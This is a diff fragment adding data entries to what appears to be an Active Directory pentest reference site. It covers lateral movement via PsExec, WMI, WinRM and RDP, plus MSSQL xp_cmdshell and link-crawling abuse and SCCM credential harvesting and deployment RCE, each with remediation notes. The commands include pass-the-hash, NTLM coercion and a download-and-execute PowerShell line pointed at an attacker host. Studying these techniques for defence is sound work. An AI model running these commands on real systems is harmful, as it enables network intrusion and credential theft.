+          { label: "WinRM (evil-winrm, quiet)", cmd: "evil-winrm -i 10.10.10.10 -u Administrator -p 'Passw0rd'" },
+          { label: "RDP (graphical)", cmd: "xfreerdp /u:Administrator /p:'Passw0rd' /v:10.10.10.10 /dynamic-resolution" }
+        ],
+        sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Confirm where the credential grants admin (NetExec)", cmd: "netexec smb 10.10.10.0/24 -u Administrator -p 'Passw0rd'\n# (Pwn3d!) on a host means admin -> pick an execution vector below" },
+              { label: "2. PsExec — creates a service over SMB, runs as SYSTEM (loud but reliable)", cmd: "psexec.py corp.local/Administrator:'Passw0rd'@10.10.10.10\n# uploads a binary to ADMIN$, registers+starts a service -> nt authority\\system" },
+              { label: "3. WMIExec — execute via WMI, no service/binary dropped (quieter)", cmd: "wmiexec.py corp.local/Administrator:'Passw0rd'@10.10.10.10\n# runs as the user (not SYSTEM); good when service creation is monitored" },
+              { label: "4. WinRM — management protocol, native remoting (blends with admin traffic)", cmd: "evil-winrm -i 10.10.10.10 -u Administrator -p 'Passw0rd'\n# with a hash:  evil-winrm -i 10.10.10.10 -u Administrator -H <nthash>\n# requires the account in Remote Management Users / WinRM enabled (5985/5986)" },
+              { label: "5. RDP — interactive desktop (when GUI access is needed)", cmd: "xfreerdp /u:'corp.local\\\\Administrator' /p:'Passw0rd' /v:10.10.10.10 /cert:ignore\n# Restricted Admin mode enables pass-the-hash RDP:  /pth:<nthash>" },
+              { label: "6. SMBExec / atexec alternatives", cmd: "smbexec.py corp.local/Administrator:'Passw0rd'@10.10.10.10   # semi-interactive, no output file on some variants\natexec.py corp.local/Administrator:'Passw0rd'@10.10.10.10 whoami  # via Task Scheduler" }
+            ]
+          },
+          {
+            title: "Vectors Compared",
+            type: "table",
+            columns: ["Vector", "Runs as / notes"],
+            rows: [
+              ["PsExec (SMB + service)", "SYSTEM; reliable, but service creation is noisy (event 7045)"],
+              ["SMBExec", "SYSTEM; similar to PsExec, slightly different artifacts"],
+              ["WMIExec (WMI)", "The user; no binary/service dropped — quieter"],
+              ["WinRM (evil-winrm)", "The user; blends with legitimate remote management"],
+              ["RDP (xfreerdp)", "Interactive desktop; Restricted Admin allows PtH"],
+              ["AtExec (Task Scheduler)", "SYSTEM; one-shot command execution"]
+            ]
+          },
+          {
+            title: "Attack Chain",
+            type: "table",
+            columns: ["Step", "Action", "Result"],
+            rows: [
+              ["1", "Obtain a valid credential/hash/ticket", "Authentication material"],
+              ["2", "NetExec-map where it is admin", "List of executable targets"],
+              ["3", "Pick the quietest working vector", "Code execution on the target"],
+              ["4", "Dump creds / act, then repeat", "Chain across the network"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["Impacket psexec/smbexec/wmiexec/atexec", "Remote execution over SMB/WMI/Task Scheduler"],
+              ["evil-winrm", "Interactive WinRM shell (password or hash)"],
+              ["xfreerdp / rdesktop", "RDP, including Restricted Admin PtH"],
+              ["NetExec", "Map admin access and run commands at scale (-x / -X)"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "MITRE ATT&CK T1021 — Remote Services", url: "https://attack.mitre.org/techniques/T1021/" },
+              { label: "Hadess — Pwning the Domain: Lateral Movement", url: "https://hadess.io/" }
+            ]
+          },
+          {
+            title: "Remediation",
+            type: "notes",
+            items: [
+              "Restrict local admin and Remote Management Users membership; enforce the principle of least privilege for remote access.",
+              "Enable the Windows Firewall to limit SMB/WMI/WinRM/RDP to management subnets and jump hosts only.",
+              "Enforce tiered administration and use Restricted Admin / Remote Credential Guard for RDP to avoid exposing credentials.",
+              "Enable command-line and PowerShell logging; alert on service creation (7045), remote WMI, and new WinRM sessions.",
+              "Detect: Impacket artifacts (randomly named services, ADMIN$ writes, __output files) and lateral admin logons (4624 type 3)."
+            ]
+          }
+        ]
+      },
+      {
+        id: "mssql-lateral",
+        name: "MSSQL Lateral Movement",
+        severity: "High",
+        ref: "https://attack.mitre.org/techniques/T1210/",
+        theory: "theory/2026-08-18-ad-fundamentals.html",
+        description: "Abuse SQL Server logins and trusted database links to execute OS commands and hop between servers — even across forest trusts.",
+        brief: "SQL Server is deeply integrated with AD: domain users can be SQL logins, sysadmins can run OS commands via xp_cmdshell, and 'linked servers' let one instance run queries (and commands) on another. Attackers enumerate reachable instances, escalate within them, execute OS commands, and traverse database links to pivot between hosts.\n\nImpact: a foothold on one SQL server frequently leads to code execution on it (as the service account) and onward to other linked instances — a movement path that works even across forest trusts.",
+        quickReference: [
+          { label: "Find/authenticate to an instance", cmd: "netexec mssql 10.10.10.10 -u svc_sql -p 'Passw0rd' -q 'SELECT @@version'" },
+          { label: "OS command via xp_cmdshell", cmd: "powershell Invoke-SQLOSCmd -Instance sql01.corp.local -Command 'whoami' -RawResults" },
+          { label: "Enumerate + crawl linked servers", cmd: "Get-SQLServerLinkCrawl -Instance sql01.corp.local -Verbose" },
+          { label: "Impacket shell", cmd: "mssqlclient.py corp.local/svc_sql:'Passw0rd'@10.10.10.10 -windows-auth" }
+        ],
+        sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Discover instances you can reach (SPNs / UDP / creds)", cmd: "# from inside the domain, SQL SPNs reveal instances:\nGet-SQLInstanceDomain | Get-SQLServerInfo -Verbose\n# test a login:\nnetexec mssql 10.10.10.10 -u 'corp.local\\svc' -p 'Passw0rd'" },
+              { label: "2. Execute OS commands via xp_cmdshell (PowerUpSQL auto-enables it)", cmd: "powershell Invoke-SQLOSCmd -Instance sql01.corp.local -Command 'whoami' -RawResults\n# Invoke-SQLOSCmd enables xp_cmdshell if disabled, runs, then disables it again\n# manual: EXEC sp_configure 'show advanced options',1; RECONFIGURE;\n#         EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami';" },
+              { label: "3. Impersonate a more privileged login (EXECUTE AS)", cmd: "# if your login can impersonate sa or a sysadmin:\nEXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER; -- now sysadmin\n# PowerUpSQL: Invoke-SQLAudit / Invoke-SQLEscalatePriv -Instance sql01" },
+              { label: "4. Crawl trusted database links to reach other servers", cmd: "Get-SQLServerLinkCrawl -Instance sql01.corp.local -Verbose\n# run a query (or command) on a linked instance:\nGet-SQLServerLinkCrawl -Instance sql01 -Query 'exec master..xp_cmdshell ''whoami'''\n# links can chain across servers and even across forest trusts" },
+              { label: "5. Get a shell / reverse shell from a linked instance", cmd: "Get-SQLServerLinkCrawl -Instance sql01 -Query \"exec master..xp_cmdshell 'powershell iex(New-Object Net.WebClient).DownloadString(''http://10.10.14.5/p.ps1'')'\"" }
+            ]
+          },
+          {
+            title: "Abuse Primitives",
+            type: "table",
+            columns: ["Primitive", "Detail"],
+            rows: [
+              ["xp_cmdshell", "OS command execution as the SQL service account (needs sysadmin)"],
+              ["EXECUTE AS / impersonation", "Escalate from a low login to sysadmin within the instance"],
+              ["Linked servers", "Run queries/commands on a remote instance the current one trusts"],
+              ["Link crawling", "Chain multiple links to reach far instances, across forest trusts"],
+              ["UNC path / xp_dirtree", "Coerce the service account to authenticate to you (relay/roast)"]
+            ]
+          },
+          {
+            title: "Attack Chain",
+            type: "table",
+            columns: ["Step", "Action", "Result"],
+            rows: [
+              ["1", "Enumerate reachable SQL instances", "Login targets"],
+              ["2", "Authenticate / impersonate to sysadmin", "Full control of the instance"],
+              ["3", "xp_cmdshell for OS execution", "Code execution as the service account"],
+              ["4", "Crawl linked servers", "Pivot to other SQL hosts / forests"],
+              ["5", "Repeat / dump creds", "Broader compromise"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["PowerUpSQL", "Discovery, xp_cmdshell, impersonation, link crawling"],
+              ["Impacket mssqlclient.py", "Interactive SQL shell (Windows auth / hash)"],
+              ["NetExec (mssql)", "Auth, query, and command execution at scale"],
+              ["mssql-relay / xp_dirtree", "Coerce the service account for relay/roasting"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "Hadess — Pwning the Domain: Lateral Movement (MSSQL)", url: "https://hadess.io/" },
+              { label: "PowerUpSQL wiki", url: "https://github.com/NetSPI/PowerUpSQL/wiki" },
+              { label: "The Hacker Recipes — MSSQL", url: "https://www.thehacker.recipes/ad/movement/mssql" }
+            ]
+          },
+          {
+            title: "Remediation",
+            type: "notes",
+            items: [
+              "Keep xp_cmdshell disabled and deny sysadmin to application/service logins; grant least privilege.",
+              "Avoid linked servers configured with high-privilege credentials; use least-privilege link accounts and audit link chains.",
+              "Run SQL Server as a low-privileged (gMSA) service account so xp_cmdshell execution is contained.",
+              "Restrict network access to SQL ports (1433/UDP 1434) to application tiers only.",
+              "Detect: xp_cmdshell enablement/execution, EXECUTE AS to sysadmin, and cross-instance link queries."
+            ]
+          }
+        ]
+      },
+      {
+        id: "sccm-abuse",
+        name: "SCCM / ConfigMgr Abuse",
+        severity: "High",
+        ref: "https://attack.mitre.org/techniques/T1072/",
+        theory: "theory/2026-08-18-ad-fundamentals.html",
+        description: "Microsoft SCCM manages endpoints with powerful accounts and can deploy code fleet-wide — its Network Access Account, Client Push, and app deployment are all abusable.",
+        brief: "System Center Configuration Manager (SCCM/ConfigMgr) is a fleet-management platform: it stores privileged accounts (the Network Access Account), can be made to authenticate to endpoints (Client Push), and can deploy applications and scripts to any managed device. Each of these is an attacker primitive.\n\nImpact: harvesting the NAA yields a domain credential; coercing Client Push captures the client-push account's authentication (crack or relay); and application/script deployment is authenticated remote code execution across every managed endpoint — a route to mass compromise from a single SCCM role abuse.",
+        quickReference: [
+          { label: "Harvest the Network Access Account (NAA)", cmd: "SharpSCCM.exe local secrets disk   (or: local secrets wmi)" },
+          { label: "Coerce Client Push, capture NTLM", cmd: "responder -I eth0   (then trigger a client-push notification to your host)" },
+          { label: "Enumerate your SCCM rights", cmd: "SharpSCCM.exe get class-instances SMS_Admin -p CategoryNames -p RoleNames" },
+          { label: "Deploy an app for RCE on a device", cmd: "SharpSCCM.exe exec -rid <ResourceID> -r <attacker_ip>" }
+        ],
+        sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Harvest the Network Access Account from a client (DPAPI-protected)", cmd: "# the NAA policy is stored, DPAPI-encrypted, in the CIM/WMI store on every client\nSharpSCCM.exe local secrets disk     # decrypt from the CIM store on disk\nSharpSCCM.exe local secrets wmi      # or from WMI\n# mimikatz # dpapi::sccm   also recovers it\n# NAA is a domain account -> immediate credential, sometimes over-privileged" },
+              { label: "2. Coerce Client Push and capture the push account's NTLM", cmd: "# stand up a listener, then trigger client-push installation toward it\nresponder -I eth0\n# SharpSCCM.exe invoke client-push -t attacker_ip   (or via the console)\n# captures the Client Push account (local admin on all clients) + machine account\n# crack (hashcat -m 5600) or relay it" },
+              { label: "3. Enumerate your effective SCCM privileges", cmd: "SharpSCCM.exe get class-instances SMS_Admin -p CategoryNames -p RoleNames -p LogonName\n# 'Full Administrator' on the compromised user = fleet-wide deployment rights" },
+              { label: "4. Deploy an application/script to a target device (authenticated RCE)", cmd: "# find an active client and its ResourceID\nSharpSCCM.exe get devices -w \"Active=1 and Client=1\"\n# execute against it (relay/capture NTLM, or run as the logged-on user / SYSTEM)\nSharpSCCM.exe exec -rid 16777220 -r attacker_ip                 # capture NTLM\nSharpSCCM.exe exec -rid 16777220 -r attacker_ip --run-as-system # run as SYSTEM" },
+              { label: "5. Clean up deployment artifacts", cmd: "# delete the created application/device collection and deployment after use" }
+            ]
+          },
+          {
+            title: "SCCM Attack Primitives",
+            type: "table",
+            columns: ["Primitive", "Detail"],
+            rows: [
+              ["Network Access Account (NAA)", "Domain account stored DPAPI-encrypted on every client — decrypt it"],
+              ["Client Push", "Coerce SCCM to authenticate with the push account (local admin on all clients)"],
+              ["Application/Script deployment", "Authenticated code execution on any managed device"],
+              ["Policy secrets", "NAA and other secrets fetchable from Management Points"],
+              ["Persistence after change", "Old NAA binaries remain decryptable on enrolled hosts"]
+            ]
+          },
+          {
+            title: "Attack Chain",
+            type: "table",
+            columns: ["Step", "Action", "Result"],
+            rows: [
+              ["1", "Foothold on an SCCM client or admin", "Access to CIM store / SCCM console"],
+              ["2", "Harvest NAA / coerce Client Push", "Domain credential / captured NTLM"],
+              ["3", "Enumerate SCCM role (Full Administrator?)", "Deployment capability"],
+              ["4", "Deploy app/script to targets", "RCE across managed endpoints"],
+              ["5", "Relay captured auth / reuse NAA", "Mass compromise"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["SharpSCCM", "NAA harvest, Client Push, enumeration, deployment"],
+              ["Mimikatz (dpapi::sccm)", "Decrypt the NAA from DPAPI"],
+              ["Responder / ntlmrelayx", "Capture/relay the coerced Client Push authentication"],
+              ["SharpDPAPI", "Alternative DPAPI decryption of SCCM secrets"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "Hadess — Pwning the Domain: Lateral Movement (SCCM)", url: "https://hadess.io/" },
+              { label: "SharpSCCM wiki", url: "https://github.com/Mayyhem/SharpSCCM/wiki" },
+              { label: "MITRE ATT&CK T1072 — Software Deployment Tools", url: "https://attack.mitre.org/techniques/T1072/" }
+            ]
+          },
+          {
+            title: "Remediation",
+            type: "notes",
+            items: [
+              "Avoid the Network Access Account where possible (use Enhanced HTTP); if used, make it a least-privilege domain account.",
+              "Disable Client Push installation, or enforce it to require Kerberos and disallow NTLM fallback.",
+              "Restrict SCCM 'Full Administrator' and deployment rights; treat the primary site server as Tier-0.",
+              "Require SMB signing and LDAP channel binding so captured SCCM authentications cannot be relayed.",
+              "Detect: SharpSCCM activity, anomalous application deployments, and Client Push authentications to non-SCCM hosts."
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
     category: "Misconfigurations",
     vulns: [
       {
